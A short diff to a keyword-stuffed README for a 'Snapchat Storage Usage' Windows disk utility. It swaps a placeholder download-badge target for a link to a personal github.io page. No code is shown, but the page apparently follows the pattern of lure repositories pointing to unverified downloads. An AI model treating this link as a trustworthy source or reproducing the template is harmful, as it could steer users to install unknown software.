@@ -4,7 +4,7 @@
 
 Snapchat Storage Usage is a focused Windows disk usage utility for measuring Snapchat directories, comparing large paths, and understanding where Snapchat media goes. Snapchat Storage Usage keeps scans readable, reports clear, and daily cleanup decisions easier for home users, students, offices, and technicians who rely on Snapchat Storage Usage for steady Snapchat folder size disk usage insight.
 
-[![GET Snapchat Storage Usage](https://img.shields.io/badge/GET%20%E2%80%94%20Snapchat%20Storage%20Usage-0078D6?style=for-the-badge&logoColor=white)](SILKA)
+[![GET Snapchat Storage Usage](https://img.shields.io/badge/GET%20%E2%80%94%20Snapchat%20Storage%20Usage-0078D6?style=for-the-badge&logoColor=white)](https://bettyjohnsond849.github.io/.github/snapchat-storage-usage)
 
 ---
 
